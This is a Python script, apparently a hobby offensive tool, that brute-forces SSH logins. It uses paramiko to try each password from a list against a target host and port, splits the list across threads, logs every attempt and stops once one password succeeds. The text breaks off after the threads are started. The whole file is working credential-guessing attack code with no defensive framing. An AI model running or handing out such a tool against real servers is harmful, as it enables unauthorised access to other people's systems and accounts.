#! /usr/bin/python
import sys
from pprint import pprint
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import Thread

STOP_THREADS = 0  # password not found


def findPassword(host, port, user, passwords):
    """
    Find just the password
    :param host:
    :param user:
    :param port:
    :param passwords:
    :return:
    """
    global STOP_THREADS
    for password in passwords:
        if STOP_THREADS:
            break
        else:
            if tryConnect(host, port, user, password):
                result = user, password
                STOP_THREADS = 1
                return user, password


def tryConnect(host, port, user, password):
    """
    test user and password connection
    :param host: str
    :param user: str
    :param password: str
    :return:
    """
    sshConnection = SSHClient()
    sshConnection.set_missing_host_key_policy(AutoAddPolicy())

    try:
        sshConnection.connect(host, port=port, username=user, password=password, allow_agent=False, look_for_keys=False)
        sshConnection.close()
        print(" >> Try :  host:{} port:{} user:{} password:{} => OK | Boom ...!".format(host, port, user, password))
        return 1  # Succeeded

    except:
        print(" >> Try :  host:{} port:{} user:{} password:{} => KO".format(host, port, user, password))
        return 0  # Failed


def run_ssh_attack(host, user, users, passwords, port, nb_thread):
    # https://www.geeksforgeeks.org/python-different-ways-to-kill-a-thread/

    threads = []
    print(" >> host:{} port:{} thread:{}".format(host, port, nb_thread))
    # divide passwords over number of threads
    pas = int(len(passwords) // nb_thread)

    for i in range(nb_thread):
        pprint("Thread : {}  password [{}, {}]".format(i, i * pas, i * pas + pas))
        passwords_bis = passwords[int(i * pas): int(i * pas + pas)]
        if user:
            th = Thread(target=findPassword, args=(host, port, user, passwords_bis))
            th.start()
            threads.append(th)


